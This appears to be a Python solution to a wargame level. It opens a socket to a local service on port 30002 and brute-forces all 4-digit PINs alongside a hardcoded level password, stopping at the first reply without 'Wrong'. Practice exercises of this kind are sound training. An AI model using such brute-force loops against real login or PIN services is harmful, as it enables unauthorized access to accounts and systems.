#!/bin/env python3
import socket
import sys

pin = 0
pwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('127.0.0.1' ,30002))
	recv_msg = s.recv(2048).decode()
	print(recv_msg)
	while pin < 10000:
		pin_str= str(pin).zfill(4)
		msg = pwd+' '+pin_str+'\n'
		s.sendall(msg.encode())
		rmsg= s.recv(2048).decode()
		if 'Wrong' in rmsg:
			print(f'Wrong pin : {pin}')
		else:
			print(rmsg)
			break
		pin +=1
		
finally:
	sys.exit()
	